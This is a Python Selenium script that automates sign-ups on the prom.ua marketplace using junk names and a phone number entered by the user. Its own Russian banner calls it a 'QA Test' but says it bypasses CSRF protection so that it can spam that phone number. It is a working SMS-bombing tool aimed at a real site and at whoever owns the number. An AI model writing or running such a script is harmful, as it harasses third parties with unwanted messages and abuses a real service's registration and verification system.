
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

options = webdriver.ChromeOptions()
options.add_argument("--headless")
options.add_argument("--log-level=3")
options.add_argument("--window-size=1400x1080")
options.add_argument("--mute-audio")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument('--disable-extensions')
options.add_argument('--disable-gpu')

driver = webdriver.Chrome(chrome_options=options,
                                executable_path="chromedriver")

def register(phone):
    driver.get('https://prom.ua/ua')
    
    try:
        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[1]/div[1]/div/div[2]/div/div/div[2]/div[3]/button[2]')))
    except:
        driver.quit()
    
    driver.find_element(By.XPATH, '/html/body/div[1]/div[1]/div[1]/div/div[2]/div/div/div[2]/div[3]/button[2]').click()
    
    try:
        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, "firstName")))
    except:
        driver.quit()
    try:
        driver.find_element(By.ID, "firstName").send_keys("ываыва")
        driver.find_element(By.ID, "lastName").send_keys("ываыва")
        driver.find_element(By.ID, "phone").send_keys(phone)
        driver.find_element(By.ID, "registrationConfirmButton").click()
        print("👌 Сообщение отправлено.")
    except:
        print("⛔ Ошибка связанная с вебдрайвером.")

if __name__ == "__main__":
    print(
        """🎀 QA Test. Обход csrf защиты при регистрации на prom.ua без особо сложных способов, с целью спамма на номер телефона."""
        )
    phone = input("👀 Введите номер телефона: ")
    register(phone)